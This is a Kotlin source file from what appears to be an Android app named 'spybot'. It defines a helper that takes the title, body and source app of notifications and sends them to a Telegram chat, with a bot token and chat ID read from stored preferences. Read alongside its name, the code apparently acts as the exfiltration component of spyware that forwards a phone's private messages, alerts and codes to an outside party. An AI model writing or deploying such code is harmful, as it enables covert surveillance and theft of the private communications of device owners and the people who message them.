package com.example.spybot.helper

import android.content.Context
import com.example.spybot.network.TelegramApiService
import com.example.spybot.utils.AppPreferences
import com.google.gson.annotations.SerializedName
import okhttp3.OkHttpClient
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.TimeUnit

// Response data class
data class TelegramResponse(
    @SerializedName("ok") val ok: Boolean,
    @SerializedName("description") val description: String? = null
)

object TelegramHelper {

    private const val BASE_URL = "https://api.telegram.org/"

    private val logging = HttpLoggingInterceptor().apply {
        level = HttpLoggingInterceptor.Level.BODY
    }

    private val client = OkHttpClient.Builder()
        .addInterceptor(logging)
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val retrofit = Retrofit.Builder()
        .baseUrl(BASE_URL)
        .client(client)
        .addConverterFactory(GsonConverterFactory.create())
        .build()

    private val apiService = retrofit.create(TelegramApiService::class.java)

    fun sendNotification(context: Context, title: String, body: String, packageName: String) {
        val token = AppPreferences.getToken(context) ?: ""
        val chatId = AppPreferences.getChatId(context) ?: ""

        if (token.isEmpty() || chatId.isEmpty()) {
            return
        }

        val message = "<b>New Notification!</b>\n\n" +
                "<b>App:</b> $packageName\n" +
                "<b>Title:</b> $title\n" +
                "<b>Body:</b> $body"

        try {
            apiService.sendMessage(chatId, message).enqueue(object : Callback<TelegramResponse> {
                override fun onResponse(call: Call<TelegramResponse>, response: Response<TelegramResponse>) {
                    // Response handled
                }

                override fun onFailure(call: Call<TelegramResponse>, t: Throwable) {
                    t.printStackTrace()
                }
            })
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
